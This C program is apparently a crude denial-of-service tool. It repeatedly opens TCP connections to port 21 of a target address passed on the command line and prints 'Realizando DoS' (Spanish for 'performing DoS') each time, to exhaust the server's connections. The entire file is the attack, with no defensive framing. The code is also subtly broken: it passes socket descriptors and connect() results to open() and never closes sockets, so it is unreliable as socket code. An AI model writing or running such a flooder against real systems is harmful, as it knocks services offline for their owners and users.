#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdbool.h>

int main(int argc, char **argv){

  int mysocket;
  int connecta;
  char *dest = argv[1];
  struct sockaddr_in target;  
  while(true){
    mysocket = socket(AF_INET, SOCK_STREAM, 0); // 0 ip protocol code
    target.sin_family = AF_INET;
    target.sin_port = htons(21);
    target.sin_addr.s_addr = inet_addr(dest);

    connecta = connect(mysocket, (struct sockaddr *)&target, sizeof target);
  
    if(connecta == 0){
      printf("Realizando DoS\n");
      open(mysocket);
      open(connecta);
    }
    else{break;}
    
  }
  
  return 0;  
}
